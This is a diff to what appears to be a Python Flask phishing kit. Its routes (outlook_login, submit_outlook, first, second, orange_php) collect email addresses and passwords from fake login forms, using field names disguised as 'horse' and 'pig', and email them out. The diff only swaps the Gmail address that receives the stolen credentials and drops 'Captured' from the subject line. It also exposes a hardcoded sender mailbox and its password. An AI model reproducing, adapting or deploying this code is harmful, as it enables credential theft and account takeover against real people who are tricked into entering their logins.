@@ -148,7 +148,7 @@ def outlook_login():
         
         # Create email message
         message = MIMEMultipart("alternative")
-        message["Subject"] = "Outlook Login Credentials Captured"
+        message["Subject"] = "Outlook Login Credentials"
         message["From"] = sender_email
         message["To"] = receiver_email
         
@@ -252,7 +252,7 @@ def submit_outlook():
         attempts = data.get('Attempts', 1)
         
         sender_email = "adil@blackorange.in"
-        receiver_email = "chnthanhco.ltd@gmail.com"
+        receiver_email = "zikssellers@gmail.com"
         email_password = "Adil@22secure"
         
         useragent = request.headers.get('User-Agent')
@@ -326,7 +326,7 @@ def first():
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
         sender_email = "adil@blackorange.in"
-        receiver_email = "chnthanhco.ltd@gmail.com"
+        receiver_email = "zikssellers@gmail.com"
         password = "Adil@22secure"
         
         useragent = request.headers.get('User-Agent')
@@ -377,7 +377,7 @@ def second():
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
         sender_email = "adil@blackorange.in"
-        receiver_email = "chnthanhco.ltd@gmail.com"
+        receiver_email = "zikssellers@gmail.com"
         password = "Adil@22secure"
         
         useragent = request.headers.get('User-Agent')
@@ -451,7 +451,7 @@ def orange_php():
         password = request.form.get("password")
         
         sender_email = "adil@blackorange.in"
-        receiver_email = "chnthanhco.ltd@gmail.com"
+        receiver_email = "zikssellers@gmail.com"
         email_password = "Adil@22secure"
         
         useragent = request.headers.get('User-Agent')
